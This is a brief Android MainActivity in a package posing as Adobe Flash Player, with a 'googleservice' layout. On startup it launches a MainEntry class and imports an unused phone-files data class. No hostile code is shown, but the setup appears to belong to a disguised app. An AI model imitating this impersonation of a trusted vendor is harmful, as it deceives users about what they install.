package com.adobe.flashplayer;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.app.Activity;
import android.os.Bundle;

import com.adobe.flashplayer.data.PhoneSDFiles;

import android.util.Base64;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_googleservice);

        new MainEntry(MainActivity.this,"").start();

    }
}
